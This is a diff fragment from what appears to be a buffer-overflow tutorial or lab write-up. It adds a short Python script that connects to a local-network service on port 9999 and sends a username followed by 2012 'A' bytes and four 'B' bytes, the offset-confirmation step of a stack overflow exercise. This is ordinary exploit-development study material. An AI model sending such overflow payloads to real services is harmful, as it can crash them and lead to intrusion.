@@ -346,7 +346,7 @@ try:
        
             # Recieve data again
             
-       s.recv(1024)
+        s.recv(1024)
        
             # Close connection with RHOST
             # End of the loop
@@ -355,6 +355,34 @@ try:
 
     # Exception script in case some error happen, return a message and exit. 
 
+except:
+        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
+        sys.exit()
+```
+
+- **No comment version:**
+
+```python  
+#!/usr/bin/python
+
+import socket
+import sys
+
+username = b"fz3r0"
+message = b"A" * 2012 + b"B" * 4
+
+try:        
+        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(('192.168.1.100',9999))      
+        s.recv(1024)
+        s.recv(1024)
+        s.send(username + b'\r\n')
+        s.recv(1024)
+        s.send(message + b'\r\n')    
+        s.recv(1024)
+        s.close()
+        
 except:
         print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
         sys.exit()
